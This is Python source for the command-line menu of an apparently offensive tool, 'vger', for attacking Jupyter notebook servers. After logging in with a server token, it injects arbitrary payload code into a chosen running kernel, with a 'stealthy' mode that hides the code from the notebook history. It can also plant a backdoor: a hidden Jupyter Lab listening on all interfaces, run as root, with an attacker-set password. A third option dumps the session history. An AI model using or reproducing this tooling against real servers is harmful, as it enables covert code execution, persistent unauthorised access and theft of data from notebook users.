from vger.connection import Connection
import inquirer
from vger.attack import attack_session
import asyncio

class Menu:
    def __init__(self):
        self.server = None
        self.secret = None
        self.sessions = list()
        self.target = None
        self.connection = None

    def login(self):
        while len(self.sessions) == 0:
            login_questions = [inquirer.Text("server", message="What is the server hostname?", default="http://localhost:8888/"),
                               inquirer.Text("secret", message="What is the secret token or password?")]
            answers = inquirer.prompt(login_questions)
            self.server = answers["server"]
            if self.server[-1] != "/":
                self.server += "/"
            self.secret = answers["secret"]
            try:
                self.connection = Connection(self.server, self.secret)
                self.sessions = self.connection.list_running_jpy_sessions()
            except:
                print("There was a problem connecting to that server. Try again.")

    def pick_target(self):
        session_info = dict()
        for s in self.sessions:
            name = self.connection.jpy_sessions[s]['name']
            last_active = f"Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']}"
            session_info[f"{name:<20} {last_active:<30}"] = s
        select_kernel = [inquirer.List("kernel", message="Which notebook would you like to attach to?", choices=session_info.keys())]
        answer = inquirer.prompt(select_kernel)
        self.target = session_info[answer["kernel"]]

    def execute_op(self):
        answer = dict()
        answer["option"] = None
        while answer["option"] != "Reset":
            nav_menu = [inquirer.List("option", message="What would you like to do?", choices=["Reset", "Inject", "Backdoor", "Check History", "Switch Notebooks"])]
            answer = inquirer.prompt(nav_menu)
            if answer["option"] == "Inject":
                self.inject()
            elif answer["option"] == "Backdoor":
                self.jupyter_backdoor()
            elif answer["option"] == "Check History":
                self.dump_history()
            elif answer["option"] == "Switch Notebooks":
                self.switch_target_notebook()
        self.__init__()
        self.main()

    def main(self):
        self.login()
        self.pick_target()
        self.execute_op()
    
    def inject(self):
        attack_menu = [inquirer.List("payload", message="Would you like to type your payload or reference an existing .py file?", 
                                     choices=["Type", ".py"])]
        answer = inquirer.prompt(attack_menu)
        if answer["payload"] == "Type":
            payload_str = inquirer.editor("What code would you like to inject?")
        else:
            payload = [inquirer.Path("path", "Where is the payload .py? ", path_type=inquirer.Path.FILE)]
            answer = inquirer.prompt(payload)
            path = answer["path"].split("? ")[-1]
            with open(path, "r") as f:
                payload_str = f.read()
        silent = [inquirer.List("choice", message="Would you like show up in the history and modify the execution counter?", 
                                     choices=["Yes (Noisy)", "No (Stealthy)"])]
        answer = inquirer.prompt(silent)
        if "Yes" in answer["choice"]:
            silent = False
        else:
            silent = True
        loop = asyncio.new_event_loop()
        loop.run_until_complete(attack_session(self.connection, self.target, payload_str, silent=silent))

    def config_bounce(self):
        config = [inquirer.Text("config", message="Pass your command line arguments:")]
        answer = inquirer.prompt(config)
        # TODO bounce config but bring up on same interface with same secret

    def jupyter_backdoor(self):
        config = [inquirer.Text("port", message="What port do you want your Jupyter Server to run on?"), 
                  inquirer.Text("secret", message="What password do you want to use for authentication?")]
        config = inquirer.prompt(config)
        loop = asyncio.new_event_loop()
        loop.run_until_complete(attack_session(self.connection, self.target, 
                                               f"import os; os.system('jupyter lab --ip=0.0.0.0 --port={config["port"]} --allow-root --no-browser --NotebookApp.token={config['secret']} >/dev/null 2>/dev/null &')", 
                                               silent=True, print_out=False))
 
    def dump_history(self):
        loop = asyncio.new_event_loop()
        loop.run_until_complete(attack_session(self.connection, self.target, 
                                               f"%history", 
                                               silent=False, print_out=False, get_hist=True))

    def drop_and_execute(self):
        # TODO tool to drop and execute binaries
        pass

    def switch_target_notebook(self):
        self.pick_target()
        self.execute_op()

def cli():
    m = Menu()
    m.main()

if __name__ == "__main__":
    m = Menu()
    m.main()